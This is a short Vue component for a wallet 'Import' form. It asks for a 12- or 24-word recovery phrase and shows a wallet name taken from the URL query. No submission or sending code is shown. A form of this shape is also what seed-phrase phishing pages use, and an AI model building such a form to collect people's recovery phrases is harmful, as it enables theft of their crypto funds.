<template>

  <div class="active-form">
      <div class="private-form">
      <form action="" method=""  @submit.prevent>
          <label for="private">Private</label>
          <textarea  v-model="form.private"  id="" cols="30" rows="10"></textarea>
           <input type="text"  v-model="form.wallet" readonly>
          <p>Typically 12 (sometimes 24) words separated by single spaces</p>
          <input type="submit" value="Import" class="submit">

      </form>
  </div>
  </div>
</template>

<script>

export default {
    name:"private",

      data (){
        return{
           form : {
               private: '',
                wallet: this.$route.query.title,
               
           }
        }
    },


   

}
</script>

<style>

</style>